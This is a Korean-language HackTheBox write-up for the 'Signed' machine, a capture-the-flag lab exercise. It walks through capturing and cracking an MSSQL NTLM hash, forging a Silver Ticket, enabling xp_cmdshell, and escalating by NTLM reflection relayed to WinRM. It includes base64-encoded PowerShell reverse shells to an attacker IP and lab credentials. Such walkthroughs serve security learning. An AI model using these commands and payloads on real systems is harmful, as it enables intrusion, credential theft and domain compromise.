# Signed - HackTheBox
- [Recon](#recon)
- [Shell as mssqlsvc](#shell-as-mssqlsvc)
- [Privesc](#privesc)
## Recon
```bash
sudo nmap -p 1433 -sC -sV -vv -oA signed 10.129.242.173
```
<img width="1204" height="293" alt="image" src="https://github.com/user-attachments/assets/98dc69ca-2d7f-4c84-8a6b-d507f703e1b7" />

- MSSQL

<br>

- `/etc/hosts`에 `dc01.signed.htb` 추가.
<img width="1204" height="77" alt="image" src="https://github.com/user-attachments/assets/86ee7eb5-04de-4698-9172-210898c91fcf" />

---
## Shell as mssqlsvc
- `MSSQL` 접속.
```bash
impacket-mssqlclient scott:'Sm230#C5NatH'@10.129.242.173
```
<img width="1204" height="291" alt="image" src="https://github.com/user-attachments/assets/60e33a08-ccfc-4f67-aac1-7fd180acf8a4" />

<br>
<br>

- 데이터베이스 자체에서는 특별한 정보 없음.
- 권한이 없어 `xp_cmdshell` 활성화 불가.
- `responder`를 사용하여 해시 캡쳐.
```bash
sudo responder -I tun0 -v
```
```
exec xp_dirtree '\\10.10.14.26\test'
```
<img width="1204" height="220" alt="image" src="https://github.com/user-attachments/assets/bdcc2905-6097-4d1d-bc20-6b80598a1c1c" />

<br>
<br>

- 크래킹.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1204" height="249" alt="image" src="https://github.com/user-attachments/assets/94d46aac-3420-46a2-b178-a1da4f8b39f5" />

<br>
<br>

- `mssqlsvc:purPLE9795!@` 로그인 성공.
```bash
nxc mssql 10.129.242.173 -u mssqlsvc -p 'purPLE9795!@'
```
<img width="1204" height="127" alt="image" src="https://github.com/user-attachments/assets/78b5cab6-d5ec-4ad6-aaa3-53c717160ddd" />

<br>
<br>

- `MSSQL` 접속.
```bash
impacket-mssqlclient mssqlsvc:'purPLE9795!@'@10.129.242.173 -windows-auth
```
<img width="1204" height="293" alt="image" src="https://github.com/user-attachments/assets/4b83eb7f-526d-4a1f-ac1f-f0c4db8cac3a" />

<br>
<br>

- `xm_cmdshell` 활성화 불가.
- `sysadmin`권한 확인.
- `IT`그룹에 속할 경우 `xp_cmdshell` 활성화가 가능할 것으로 판단.
- 직접 그룹에 추가할 수 없어 Silver Ticket 공격 시도.
```
SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
```
<img width="1204" height="675" alt="image" src="https://github.com/user-attachments/assets/3c96bebd-3485-4f5c-829a-383675a16205" />

<br>
<br>

- `IT`그룹의 SID 확인.
```
SQL (SIGNED\mssqlsvc  guest@master)> select SUSER_SID('signed\it');
```
<img width="1204" height="101" alt="image" src="https://github.com/user-attachments/assets/21ebafcc-9811-4a59-a450-1cb11e6ae8dd" />

<br>
<br>

- https://github.com/Pennyw0rth/NetExec/blob/main/nxc/protocols/mssql.py
- `nxc`에서 `mssql`을 사용하여 `rid-brute`옵션을 사용할 수 있는데, 해당 코드를 통해서 MSSQL로 얻은 바이너리 SID를 변환할 수 있을 것으로 판단.
<img width="920" height="199" alt="image" src="https://github.com/user-attachments/assets/67115761-2047-4436-ad19-066a893da760" />

<br>
<br>

- 변환된 SID 획득.
```python3
from impacket.dcerpc.v5.dtypes import SID;

raw = '0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000';

converted = SID(bytes.fromhex(raw)).formatCanonical();
```
<img width="1204" height="218" alt="image" src="https://github.com/user-attachments/assets/b931f8b8-c0a9-4d65-afe6-af64269327d7" />

<br>
<br>

- 획득한 `mssqlsvc`의 비밀번호를 ntlm 해시로 변환.
```bash
echo -n 'purPLE9795!@' | iconv -t utf-16le | openssl md4 -provider legacy
```
<img width="1204" height="88" alt="image" src="https://github.com/user-attachments/assets/4ab00492-40dd-4ff5-8eeb-9b3885bc3f84" />

<br>
<br>

- `IT`그룹을 지정하여 티켓 발행.(mssqlsvc의 RID는 1103)
```bash
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn mssqlsvc/dc01.signed.htb -user-id 1103 -groups '1105' IT
```
<img width="1204" height="414" alt="image" src="https://github.com/user-attachments/assets/6fe32737-b66e-4c30-8880-afaa5cf6447f" />

<br>
<br>

- 발행된 티켓을 사용하여 `MSSQL` 접속.
<img width="1204" height="294" alt="image" src="https://github.com/user-attachments/assets/f9fd5f12-4432-45b4-b495-4e95c0ec00b8" />

<br>
<br>

- `xp_cmdshell` 활성화하여 명령어 실행 성공.
```
SQL (SIGNED\mssqlsvc  dbo@master)> EXECUTE sp_configure 'show advanced options', 1

SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE

SQL (SIGNED\mssqlsvc  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1

SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE

SQL (SIGNED\mssqlsvc  dbo@master)> exec xp_cmdshell 'whoami';
```
<img width="1204" height="294" alt="image" src="https://github.com/user-attachments/assets/be008f84-f03a-49bb-9260-489fdfe66da6" />

<br>
<br>

- 리버스 셸 실행.
```
SQL (SIGNED\mssqlsvc  dbo@master)> exec xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA2ACIALAA4ADAAMAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';
```
<img width="1204" height="294" alt="image" src="https://github.com/user-attachments/assets/af270dc7-0cde-421f-8201-29575b1da6e3" />

<br>
<br>

- 셸 획득.
<img width="1204" height="172" alt="image" src="https://github.com/user-attachments/assets/bdc5517f-9ef7-4e73-a3c4-1c66e19a8f39" />

---
## Privesc
- 외부에서 다른 포트에 접근이 불가능하여 터널링이 필요하다고 판단.
- 로컬로부터 `chisel`를 다운로드 받아서 실행.
```powershell
.\chisel.exe client 10.10.14.26:1234 R:socks
```
```bash
./chisel server --reverse -p 1234 --socks5
```
<img width="1204" height="29" alt="image" src="https://github.com/user-attachments/assets/037ebf05-a064-47f4-8a88-067d166b0811" />
<img width="1204" height="150" alt="image" src="https://github.com/user-attachments/assets/90ce6a9e-06ee-43f3-9b45-a9bf2801b7c4" />

<br>
<br>

- `/etc/proxychains4.conf` 수정.
<img width="1204" height="122" alt="image" src="https://github.com/user-attachments/assets/dfca5c84-ee6d-4201-b362-26519eac76dc" />

<br>
<br>

- 외부에서 접속 가능.
- 서명 활성화가 되어 있음.
```bash
proxychains nxc smb 10.129.242.173
```
<img width="1204" height="298" alt="image" src="https://github.com/user-attachments/assets/f9e31634-c585-439a-b4a0-be0d447d9399" />

<br>
<br>

- https://www.rbtsec.com/blog/ntlm-reflection-abusing-ntlm-for-privilege-escalation-cve-2025-33073/
- 서명 강제가 활성화 되어 있지 않다면 `NLTM reflection` 공격이 가능할 것으로 판단.
<img width="560" height="172" alt="image" src="https://github.com/user-attachments/assets/6f804bbf-e3d8-4033-a20a-4e60a480e493" />

<br>
<br>

- 서명 강제 인증 유도 가능.
```bash
proxychains nxc smb 127.0.0.1 -u mssqlsvc -p 'purPLE9795!@' -M coerce_plus
```
<img width="1203" height="507" alt="image" src="https://github.com/user-attachments/assets/2ee8fb84-4ff4-4abd-9aef-3f4a28eb9600" />

<br>
<br>

- 로컬로 오는 요청을 서버로 릴레잉.
```bash
proxychains impacket-ntlmrelayx -t dc01.signed.htb -smb2support
```
<img width="1203" height="33" alt="image" src="https://github.com/user-attachments/assets/4d255003-7e3b-4cb4-984e-5c930466fa7d" />

<br>
<br>

- https://github.com/dirkjanm/krbrelayx
- 가짜 DNS 생성.
```bash
proxychains python3 ~/util/krbrelayx/dnstool.py -u 'signed.htb\mssqlsvc' -p 'purPLE9795!@' dc01.signed.htb -a add -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -d 10.10.14.26 -dns-ip 10.129.242.173
```
<img width="1203" height="294" alt="image" src="https://github.com/user-attachments/assets/496b43dc-1d90-4a00-a24c-e6c8ead5f65f" />

<br>
<br>

- 인증 시도.
```bash
proxychains nxc smb 127.0.0.1 -u mssqlsvc -p 'purPLE9795!@' -M coerce_plus -o METHOD=PetitPotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```
<img width="1203" height="490" alt="image" src="https://github.com/user-attachments/assets/e1ccce18-ad95-41a6-b05e-a05476707831" />

<br>
<br>

- `SMB`에 대해서 강제 인증은 성공하였으나 실제 접근은 거부됨.
<img width="1203" height="225" alt="image" src="https://github.com/user-attachments/assets/e0b87c00-0329-4235-a2b7-03ad7b11008d" />

<br>
<br>

- `WINRM`으로 시도하여 성공.
```bash
proxychains impacket-ntlmrelayx -t winrms://dc01.signed.htb -smb2support
```
<img width="1203" height="246" alt="image" src="https://github.com/user-attachments/assets/bb588f20-7028-4cbb-abff-8d047232a535" />

<br>
<br>

- `11000`번으로 연결 시도하여 셸 획득.
<img width="1203" height="151" alt="image" src="https://github.com/user-attachments/assets/4c529051-1eee-45e7-9d5d-0e6a16603e1d" />

<br>
<br>

- 리버스 셸 실행.
```powershell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA2ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```
<img width="1203" height="294" alt="image" src="https://github.com/user-attachments/assets/2e321afe-df18-4629-9c19-ebd24d3c436a" />

<br>
<br>

- 셸 획득.
<img width="1203" height="174" alt="image" src="https://github.com/user-attachments/assets/97f3be01-310a-455c-b0df-3b814c130f72" />

---
## FLAG
- `c:\users\mssqlsvc\desktop\user.txt`
<img width="1203" height="225" alt="image" src="https://github.com/user-attachments/assets/cde6415b-7c86-46e0-b0c6-792d07077f2e" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1203" height="225" alt="image" src="https://github.com/user-attachments/assets/56de7f79-e8a0-40e9-be67-91e1ac7b4e32" />
